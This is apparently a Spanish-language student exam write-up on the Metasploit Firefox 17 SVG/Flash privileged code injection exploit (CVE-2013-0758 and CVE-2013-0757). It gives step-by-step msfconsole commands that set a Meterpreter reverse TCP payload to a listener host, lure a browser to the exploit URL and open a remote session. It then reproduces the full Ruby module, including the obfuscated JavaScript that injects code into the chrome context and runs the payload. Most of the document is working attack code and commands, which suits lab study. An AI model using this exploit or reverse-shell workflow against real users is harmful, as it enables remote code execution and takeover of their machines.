# ciberseguridad-Parcial
Examen Parcial Ciberseguridad 


exploit/multi/browser/firefox_svg_plugin: Este exploit obtiene la ejecución remota de código en Firefox 17 y 17.0.1, siempre que el usuario haya instalado Flash. No se utiliza la corrupción de la memoria. Primero, un objeto Flash se clona en el contenido anónimo del elemento "use" de SVG en <body> (CVE-2013-0758). Desde allí, el objeto Flash puede navegar un marco secundario a una URL en el esquema chrome: //. Luego, se utiliza un exploit (CVE-2013-0757) para omitir la envoltura de seguridad alrededor de la referencia de la ventana del marco secundario e inyectar código en el contexto chrome: //. Una vez que tenemos la inyección en el contexto de ejecución de Chrome, podemos escribir la carga útil en el disco, chmod it (si es posix) y luego ejecutar. Nota: Flash se usa aquí para desencadenar la vulnerabilidad, pero cualquier complemento de Firefox con acceso a script debería poder activarlo.

El investigador de seguridad Mariusz Mlynski informó que es posible abrir una página web con privilegios de Chrome a través de objetos de complemento a través de la interacción con elementos SVG. Esto podría permitir la ejecución de código arbitrario.

En general, estas fallas no se pueden explotar a través del correo electrónico en los productos Thunderbird y SeaMonkey debido a que las secuencias de comandos están deshabilitadas, pero son potencialmente un riesgo en el navegador o en contextos similares a un navegador en esos productos.

Objetivos

    Universal (Javascript XPCOM Shell)
    Carga útil nativa

Nombre del modulo:  

ID MSF: exploit/multi/browser/firefox_svg_plugin
Type: metasploit	


Arquitecturas
Firefox 
x86, x86_64, x64, mips, mipsle, mipsbe, mips64, mips64le, ppc, ppce500v2, ppc64, ppc64le, cbea, cbea64, sparc, sparc64, armle, armbe, aarch64, cmd, php, tty, java, ruby, dalvik, python, nodejs, firefox, zarch, r


•	Vulnerabilidad:

         	

CVE-2013-0758 (CWE ID 94) - CVE-2013-0757 (CWE ID 264)  (Módulo de metasploit) (Confidencialidad Impacto completo (se divulga la información total, lo que hace que se revelen todos los archivos del sistema).
Impacto de integridad completo (existe un compromiso total con la integridad del sistema. Existe una pérdida completa de la protección del sistema, lo que hace que todo el sistema se vea comprometido).
Impacto de disponibilidad completado (hay un cierre total del recurso afectado. El atacante puede hacer que el recurso no esté completamente disponible).
Complejidad de acceso baja (No existen condiciones de acceso especializadas o circunstancias atenuantes. Se requiere muy poco conocimiento o habilidad para explotar).
No se requiere autenticación (no se requiere autenticación para explotar la vulnerabilidad).
Acceso ganado Ninguno
Tipo (s) de vulnerabilidad Ejecutar Código


Gentoo Linux: CVE-2013-0757: Productos Mozilla: Múltiples vulnerabilidades

permite a los atacantes remotos ejecutar código JavaScript arbitrario con privilegios de cromo haciendo referencia a Object.prototype .__ proto__ en un documento HTML elaborado.


USN-1681-1: Firefox vulnerabilities

Múltiples vulnerabilidades no especificadas en el motor del navegador en Mozilla Firefox antes de 18.0, Thunderbird antes de 17.0.2 y SeaMonkey antes de 2.15 permiten a los atacantes remotos causar una denegación de servicio (corrupción de memoria y bloqueo de la aplicación) o posiblemente ejecutar código arbitrario a través de vectores desconocidos.



•	Sistema Operativo: 

    firefox
    java
    linux
    osx
    solaris
    windows



•	Software: 


Sistema operativo:

Kali Linux: Diseñada principalmente para la auditoría y seguridad informática en general
Herramientas: Metasploit: proporciona información acerca de vulnerabilidades de seguridad

Modulo: exploit/multi/browser/firefox_svg_plugin


•	Instructivo:

Requisitos:


PASO A PASO

1)	msf > use exploit/multi/browser/firefox_svg_plugin
2)	msf exploit(firefox_svg_plugin) > show options
3)	msf exploit(firefox_svg_plugin) > show targets
4)	msf exploit(firefox_svg_plugin) > set target 1
5)	msf exploit(firefox_svg_plugin) > set payload windows
6)	msf exploit(firefox_svg_plugin) > set payload windows/meterpreter/reverse tcp
7)	msf exploit(firefox_svg_plugin) >set LHOST 10.191.5.5
8)	msf exploit(firefox_svg_plugin) > exploit
9)	copier http://10.191.5.5:8080/0MotqBs
10)	ejecutar en el browser http://10.191.5.5:8080/0MotqBs
11)	msf exploit(firefox_svg_plugin) >  informacion plugin
12)	msf exploit(firefox_svg_plugin) > sessions –i 1
13)	Meterpreter  > sysinfo
14)	Meterpreter  > cd
15)	Meterpreter  > ls
16)	Ejecucion Ipv4 : 10.191.5.6





	
##


# This module requires Metasploit: https://metasploit.com/download


# Current source: https://github.com/rapid7/metasploit-framework


##





class MetasploitModule < Msf::Exploit::Remote


Rank = ExcellentRanking





include Msf::Exploit::Remote::BrowserExploitServer


include Msf::Exploit::EXE


# include Msf::Exploit::Remote::BrowserAutopwn


include Msf::Exploit::Remote::FirefoxPrivilegeEscalation





# autopwn_info({


# :ua_name => HttpClients::FF,


# :ua_minver => "17.0",


# :ua_maxver => "17.0.1",


# :javascript => true,


# :rank => NormalRanking


# })





def initialize(info = {})


super(update_info(info,


'Name' => 'Firefox 17.0.1 Flash Privileged Code Injection',


'Description' => %q{


This exploit gains remote code execution on Firefox 17 and 17.0.1, provided


the user has installed Flash. No memory corruption is used.





First, a Flash object is cloned into the anonymous content of the SVG


"use" element in the <body> (CVE-2013-0758). From there, the Flash object


can navigate a child frame to a URL in the chrome:// scheme.





Then a separate exploit (CVE-2013-0757) is used to bypass the security wrapper


around the child frame's window reference and inject code into the chrome://


context. Once we have injection into the chrome execution context, we can write


the payload to disk, chmod it (if posix), and then execute.





Note: Flash is used here to trigger the exploit but any Firefox plugin


with script access should be able to trigger it.


},


'License' => MSF_LICENSE,


'Targets' => [


[


'Universal (Javascript XPCOM Shell)', {


'Platform' => 'firefox',


'Arch' => ARCH_FIREFOX


}


],


[


'Native Payload', {


'Platform' => %w{ java linux osx solaris win },


'Arch' => ARCH_ALL


}


]


],


'DefaultTarget' => 0,


'Author' =>


[


'Marius Mlynski', # discovery & bug report


'joev', # metasploit module


'sinn3r' # metasploit fu


],


'References' =>


[


['CVE', '2013-0758'], # navigate a frame to a chrome:// URL


['CVE', '2013-0757'], # bypass Chrome Object Wrapper to talk to chrome://


['OSVDB', '89019'], # maps to CVE 2013-0757


['OSVDB', '89020'], # maps to CVE 2013-0758


['URL', 'http://www.mozilla.org/security/announce/2013/mfsa2013-15.html'],


['URL', 'https://bugzilla.mozilla.org/show_bug.cgi?id=813906']


],


'DisclosureDate' => 'Jan 08 2013',


'BrowserRequirements' => {


:source => 'script',


:ua_name => HttpClients::FF,


:ua_ver => /17\..*/,


:flash => /[\d.]+/


}


))





register_options(


[


OptString.new('CONTENT', [ false, "Content to display inside the HTML <body>.", '' ] ),


OptBool.new('DEBUG_JS', [false, "Display some alert()'s for debugging the payload.", false])


], Auxiliary::Timed)





end





def on_request_exploit(cli, request, info)


if request.uri =~ /\.swf$/


# send Flash .swf for navigating the frame to chrome://


print_status("Sending .swf trigger.")


send_response(cli, flash_trigger, { 'Content-Type' => 'application/x-shockwave-flash' })


else


# send initial HTML page


print_status("Target selected: #{target.name}")


print_status("Sending #{self.name}")


send_response_html(cli, generate_html(cli, target))


end


end





# @return [String] the contents of the .swf file used to trigger the exploit


def flash_trigger


swf_path = File.join(Msf::Config.data_directory, "exploits", "cve-2013-0758.swf")


@flash_trigger ||= File.read(swf_path)


end





# @return [String] containing javascript that will alert a debug string


# if the DEBUG is set to true


def js_debug(str, quote="'")


if datastore['DEBUG_JS'] then "alert(#{quote}#{str}#{quote})" else '' end


end





# @return [String] HTML that is sent in the first response to the client


def generate_html(cli, target)


vars = {


:symbol_id => 'a',


:random_domain => 'safe',


:payload => run_payload, # defined in FirefoxPrivilegeEscalation mixin


:payload_var => 'c',


:payload_key => 'k',


:payload_obj_var => 'payload_obj',


:interval_var => 'itvl',


:access_string => 'access',


:frame_ref => 'frames[0]',


:frame_name => 'n',


:loader_path => "#{get_module_uri}.swf",


:content => self.datastore['CONTENT'] || ''


}


script = js_obfuscate %Q|


var #{vars[:payload_obj_var]} = #{JSON.unparse({vars[:payload_key] => vars[:payload]})};


var #{vars[:payload_var]} = #{vars[:payload_obj_var]}['#{vars[:payload_key]}'];


function $() {


document.querySelector('base').href = "http://www.#{vars[:random_domain]}.com/";


}


function _() {


return '#{vars[:frame_name]}';


}


var #{vars[:interval_var]} = setInterval(function(){


try{ #{vars[:frame_ref]}['#{vars[:access_string]}'] }


catch(e){


clearInterval(#{vars[:interval_var]});


var p = Object.getPrototypeOf(#{vars[:frame_ref]});


var o = {__exposedProps__: {setTimeout: "rw", call: "rw"}};


Object.prototype.__lookupSetter__("__proto__").call(p, o);


p.setTimeout.call(#{vars[:frame_ref]}, #{vars[:payload_var]}, 1);


}


}, 100);


document.querySelector('object').data = "#{vars[:loader_path]}";


document.querySelector('use').setAttributeNS(


"http://www.w3.org/1999/xlink", "href", location.href + "##{vars[:symbol_id]}"


);


|



%Q|


<!doctype html>


<html>


<head>


<base href="chrome://browser/content/">


</head>


<body>





<svg style='position: absolute;top:-500px;left:-500px;width:1px;height:1px'>


<symbol id="#{vars[:symbol_id]}">


<foreignObject>


<object></object>


</foreignObject>


</symbol>


<use />


</svg>





<script>


#{script}


</script>

<iframe style="position:absolute;top:-500px;left:-500px;width:1px;height:1px"


name="#{vars[:frame_name]}"></iframe>


#{vars[:content]}


</body>


</html>


|


end

end
